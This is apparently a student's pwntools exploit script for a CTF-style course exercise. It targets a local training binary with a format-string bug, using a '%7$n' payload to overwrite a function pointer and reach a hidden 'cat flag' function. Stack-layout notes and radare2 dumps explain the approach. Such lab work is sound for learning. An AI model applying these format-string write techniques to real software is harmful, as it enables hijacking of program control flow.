#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise5/exercise5b'
exe = './exercise5b'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x400000
binsz    15204
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
0x004011f6 23 sym.func0
0x0040120d 23 sym.func1
0x00401224 35 sym.func2
0x00401247 23 sym.uncallable
0x0040125e 252 sym.get_number
0x0040135a 287 main
0x0040135a 287 sym.main
'''

'''
0x00402008 32 str.This_will_not_give_you_the_flag
0x00402028 26 str.This_is_not_useful_either
0x00402042 12 str.Maybe_this
0x0040204e 6 str.No...
0x00402054 9 str.cat_flag
0x00402060 37 str.Enter_number_of_the_function_to_run:
0x00402085 6 str.128s
0x0040208b 17 str.Function_number
0x0040209c 27 str.does_not_exist__chosing_0
0x004020b7 7 str.is_ok
0x004020be 12 str.n__p__n__p
'''

'''
main:
print("n %p &n %p\n") #address of func0?
'''

i = 1;

#main
print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"n (nil) &n [address]"

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvline()) #"Enter number of the function to run:"

#read in via scanf
#scanf into format address, scanf("128s", &format)
#atoi value at &format and store it into rax

#store result (rax) at address pointed by func0

#after invoking get_number and returning to the main function, the stack pointer points at a slot
# that is 2 stack slots below where func0 is stored
#Via assembly code can read following stack layout:

#                  uncallable  | [something]
#                  func2       | [something]
#                  func1       | [something]
#                  func0       | [something]
#                  [something] | [something]
#sp points here -> [something] | [something]

#We can still leak the stack with 
#%p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  %p  
#oberseve: it needs 9 %p  before the content of the stack, where the input string
#is stored, is shown.
#0x40209b  (nil)  (nil)  0x19[...]9  0x10  0x63[...]31  [func0-address]  0x200[...]3  0x1  [input string]
#We need to overwrite the stackslot where [func0-address] resides such that, when we enter some invalid number (I presume due to our payload), 
#then we get 0 as default choice, hence in main, the address

#idea: if sp ponts 2 stackslots below func0 and func0 will be called, then
#cause the stack ponter to move to stackslot that is 2 slots below uncallable
#-> move sp to func1
#https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf

n_th_argument = b"%7$n"
move_sp_by = b'ABC'

payload = move_sp_by + n_th_argument #move to stackslot and choose 7nth argument to use/print out

r.sendline(payload)

#main
print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvall(timeout=5)) #"Function number ABC is ok\n#"n (nil) $n [address]""
